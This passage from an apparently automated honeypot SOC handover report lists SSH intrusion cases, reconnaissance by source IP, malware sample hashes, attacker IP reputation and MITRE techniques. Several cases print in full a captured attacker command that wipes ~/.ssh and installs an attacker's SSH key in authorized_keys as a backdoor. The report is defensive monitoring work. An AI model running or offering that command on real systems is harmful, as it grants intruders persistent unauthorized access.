| `2026-04-05 20:18:21` | `cowrie.command.input` |
| `2026-04-05 20:18:21` | `cowrie.session.file_download` |
| `2026-04-05 20:18:21` | `cowrie.log.closed` |
| `2026-04-05 20:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d24b3f57da8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:18 |
| **Last Seen** | 2026-04-05 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:18:24` | `cowrie.session.connect` |
| `2026-04-05 20:18:24` | `cowrie.client.version` |
| `2026-04-05 20:18:25` | `cowrie.client.kex` |
| `2026-04-05 20:18:26` | `cowrie.login.success` |
| `2026-04-05 20:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c52d6a33666d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:19 |
| **Last Seen** | 2026-04-05 20:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:19:21` | `cowrie.session.connect` |
| `2026-04-05 20:19:21` | `cowrie.client.version` |
| `2026-04-05 20:19:21` | `cowrie.client.kex` |
| `2026-04-05 20:19:22` | `cowrie.login.success` |
| `2026-04-05 20:19:23` | `cowrie.session.params` |
| `2026-04-05 20:19:23` | `cowrie.command.input` |
| `2026-04-05 20:19:23` | `cowrie.command.failed` |
| `2026-04-05 20:19:23` | `cowrie.log.closed` |
| `2026-04-05 20:19:24` | `cowrie.session.params` |
| `2026-04-05 20:19:24` | `cowrie.command.input` |
| `2026-04-05 20:19:24` | `cowrie.session.file_download` |
| `2026-04-05 20:19:24` | `cowrie.log.closed` |
| `2026-04-05 20:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d45cc9445a7a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:19 |
| **Last Seen** | 2026-04-05 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:19:28` | `cowrie.session.connect` |
| `2026-04-05 20:19:28` | `cowrie.client.version` |
| `2026-04-05 20:19:28` | `cowrie.client.kex` |
| `2026-04-05 20:19:29` | `cowrie.login.success` |
| `2026-04-05 20:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5dedfef948

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:26 |
| **Last Seen** | 2026-04-05 20:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:26:06` | `cowrie.session.connect` |
| `2026-04-05 20:26:06` | `cowrie.client.version` |
| `2026-04-05 20:26:06` | `cowrie.client.kex` |
| `2026-04-05 20:26:07` | `cowrie.login.success` |
| `2026-04-05 20:26:07` | `cowrie.session.params` |
| `2026-04-05 20:26:07` | `cowrie.command.input` |
| `2026-04-05 20:26:07` | `cowrie.command.failed` |
| `2026-04-05 20:26:07` | `cowrie.log.closed` |
| `2026-04-05 20:26:07` | `cowrie.session.params` |
| `2026-04-05 20:26:07` | `cowrie.command.input` |
| `2026-04-05 20:26:07` | `cowrie.session.file_download` |
| `2026-04-05 20:26:07` | `cowrie.log.closed` |
| `2026-04-05 20:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d982a240ed

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:26 |
| **Last Seen** | 2026-04-05 20:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:26:09` | `cowrie.session.connect` |
| `2026-04-05 20:26:09` | `cowrie.client.version` |
| `2026-04-05 20:26:09` | `cowrie.client.kex` |
| `2026-04-05 20:26:09` | `cowrie.login.success` |
| `2026-04-05 20:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09fd7a2625e7

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:29 |
| **Last Seen** | 2026-04-05 20:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:29:58` | `cowrie.session.connect` |
| `2026-04-05 20:29:58` | `cowrie.client.version` |
| `2026-04-05 20:29:59` | `cowrie.client.kex` |
| `2026-04-05 20:30:00` | `cowrie.login.success` |
| `2026-04-05 20:30:01` | `cowrie.session.params` |
| `2026-04-05 20:30:01` | `cowrie.command.input` |
| `2026-04-05 20:30:01` | `cowrie.command.failed` |
| `2026-04-05 20:30:01` | `cowrie.log.closed` |
| `2026-04-05 20:30:02` | `cowrie.session.params` |
| `2026-04-05 20:30:02` | `cowrie.command.input` |
| `2026-04-05 20:30:02` | `cowrie.session.file_download` |
| `2026-04-05 20:30:02` | `cowrie.log.closed` |
| `2026-04-05 20:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65319a85a4ff

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:30 |
| **Last Seen** | 2026-04-05 20:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:30:05` | `cowrie.session.connect` |
| `2026-04-05 20:30:05` | `cowrie.client.version` |
| `2026-04-05 20:30:06` | `cowrie.client.kex` |
| `2026-04-05 20:30:07` | `cowrie.login.success` |
| `2026-04-05 20:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.76.105[.]16` | **26** | 2026-04-05 19:56 | 2026-04-05 20:17 | 35m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]80` | **24** | 2026-04-05 19:57 | 2026-04-05 20:30 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `74.91.224[.]229` | **12** | 2026-04-05 20:01 | 2026-04-05 20:28 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.24[.]136` | **2** | 2026-04-05 19:54 | 2026-04-05 19:57 | 4m | 0 | `T1592` | 🟢 LOW |
| `1.30.199[.]218` | 1 | 2026-04-05 19:59 | 2026-04-05 20:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.6.44[.]221` | 1 | 2026-04-05 19:52 | 2026-04-05 19:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.59.7[.]18` | 1 | 2026-04-05 19:51 | 2026-04-05 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.12.63[.]1` | 1 | 2026-04-05 20:11 | 2026-04-05 20:11 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `1.30.199[.]218` | CN | China unicom InnerMongolia province network | **100** ⚠️ | 50 |
| `74.91.224[.]229` | SG | Newfold Digital, Inc. | **100** ⚠️ | 2 |
| `117.6.44[.]221` | VN | Viettel Group | **100** ⚠️ | 50 |
| `175.12.63[.]1` | CN | CHINANET HUNAN PROVINCE NETWORK | **100** ⚠️ | 13 |
| `180.76.105[.]16` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `123.59.7[.]18` | CN | CloudVsp.Inc | **100** ⚠️ | 50 |
| `115.190.24[.]136` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 38 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `103.74.20[.]28` | PK | Wizard's Network (Pvt.) Ltd. | **45** | 0 |
| `50.116.51[.]172` | US | Linode | 16 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 96 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 42 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 29 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |

---

## 🔕 False Positive Summary (77 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 51 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 174 cases |
| Tool 34  | Credential Extractor        | ✅ 71 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 12 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 77 filtered (44.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 29 priority case(s) shown individually · 8 recon entry/entries in table (4 group(s) consolidating 64 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-05T20:31:06Z_
